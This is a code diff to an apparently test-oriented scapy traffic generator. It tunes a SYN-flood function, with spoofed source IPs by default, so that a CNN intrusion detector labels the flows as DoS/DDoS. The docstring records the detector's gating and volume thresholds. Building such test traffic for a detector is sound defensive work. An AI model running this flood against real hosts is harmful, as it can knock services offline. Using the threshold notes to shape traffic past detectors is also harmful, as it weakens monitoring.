@@ -45,25 +45,38 @@ from scapy.all import IP, TCP, ARP, send
 
 def dos_flood(target_ip: str, target_port: int = 80, duration_seconds: int = 15,
               packet_rate: int = 100, spoof_source: bool = True,
-              packets_per_flow: int = 3):
+              packets_per_flow: int = 150):
     """
-    SYN flood — sends a stream of TCP SYN packets with randomized source
-    ports and (by default) randomized spoofed source IPs, at a controlled
-    rate, for a fixed duration. Matches the DoS-SYN_FLOOD class your model
-    was trained on.
+    SYN flood — sends a stream of TCP SYN packets sharing one source port per
+    flow (with, by default, randomized spoofed source IPs), at a controlled
+    rate, for a fixed duration. Matches the DoS-SYN_FLOOD class the model was
+    trained on.
 
-    GATE NOTE (same issue recon_scan() handles): flows are keyed on the full
-    5-tuple including src_port, and stream_pipeline.py drops any flow with
-    fewer than 2 packets as INSUFFICIENT_EVIDENCE before the CNN sees it. A
-    fresh random src_port on every single SYN therefore produces only
-    1-packet flows, and the flood self-gates into INSUFFICIENT_EVIDENCE
-    (only a handful leak through via random src_port collisions). So we send
-    `packets_per_flow` SYNs sharing one src_port (>=2 required) before rolling
-    to the next src_port — each per-flow burst clears the gate and reaches the
-    classifier, while the stream of distinct source ports still reads as a
-    flood. Set packets_per_flow=1 to reproduce the old self-gating behavior.
+    FLOW-SHAPE NOTE (two thresholds, both empirically verified against the
+    trained 5-class CNN — see the model-driven checks in project scratchpad):
+
+      1. THE GATE: flows are keyed on the full 5-tuple including src_port, and
+         stream_pipeline.py drops any flow with <2 packets as
+         INSUFFICIENT_EVIDENCE before the CNN sees it. A fresh random src_port
+         per SYN produces only 1-packet flows -> everything self-gates.
+
+      2. THE CLASSIFICATION THRESHOLD: clearing the gate is NOT enough. The CNN
+         keys DoS/DDoS on per-flow VOLUME (Tot sum, syn_count, Rate). A flow of
+         only a few SYNs looks exactly like a recon probe and classifies as
+         Reconnaissance; ~50 SYNs reads as Spoofing; it takes ~>=100 SYNs in a
+         SINGLE 5-tuple flow before the model calls it DoS/DDoS (at ~100 SYNs
+         P(DoS/DDoS) jumps to 1.0). Rate does not matter — packet COUNT does.
+
+    So we hold one src_port for `packets_per_flow` SYNs (default 150, safely
+    above the ~100 threshold) before rolling to the next src_port. Each flow is
+    then a high-volume SYN burst the CNN reliably labels DoS/DDoS, and repeated
+    flows from the same source drive the Risk Engine's frequency escalation.
+    Total packet volume is unchanged (still packet_rate * duration) — only how
+    often src_port rolls changes. NOTE: at packet_rate=100 a 150-packet flow
+    takes ~1.5s, so keep duration >= a few seconds to complete whole flows.
+    packets_per_flow < ~100 will classify as Reconnaissance/Spoofing, NOT DoS.
     """
-    packets_per_flow = max(2, packets_per_flow)  # <2 would self-gate; keep it honest
+    packets_per_flow = max(2, packets_per_flow)  # <2 self-gates; <~100 misclassifies (see docstring)
     print(f"[DoS] Starting SYN flood against {target_ip}:{target_port} "
           f"for {duration_seconds}s at ~{packet_rate} pkt/s "
           f"(spoof_source={spoof_source}, packets_per_flow={packets_per_flow}) ...")
@@ -81,8 +94,9 @@ def dos_flood(target_ip: str, target_port: int = 80, duration_seconds: int = 15,
                 base = IP(src=src_ip, dst=target_ip)
             else:
                 base = IP(dst=target_ip)
-            # Burst several SYNs from the SAME src_port so this 5-tuple flow
-            # has >=2 packets and clears the INSUFFICIENT_EVIDENCE gate.
+            # Burst many SYNs from the SAME src_port so this 5-tuple flow is a
+            # high-volume SYN burst (>=~100 pkts) the CNN labels DoS/DDoS, not
+            # just a >=2-packet flow that merely clears the gate (see docstring).
             for _ in range(packets_per_flow):
                 if time.time() >= end_time:
                     break
@@ -211,9 +225,10 @@ def main():
                          help="Packets per second (defaults vary by mode)")
     parser.add_argument("--no-spoof-source", action="store_true",
                          help="For dos mode: disable source IP spoofing (use real source)")
-    parser.add_argument("--packets-per-flow", type=int, default=3,
+    parser.add_argument("--packets-per-flow", type=int, default=150,
                          help="For dos mode: SYNs sent per src_port before rolling to the "
-                              "next (must be >=2 to clear the INSUFFICIENT_EVIDENCE gate)")
+                              "next. Needs to be >=~100 for the flow to classify as DoS/DDoS "
+                              "rather than Reconnaissance/Spoofing (default 150).")
     args = parser.parse_args()
 
     print("=" * 60)
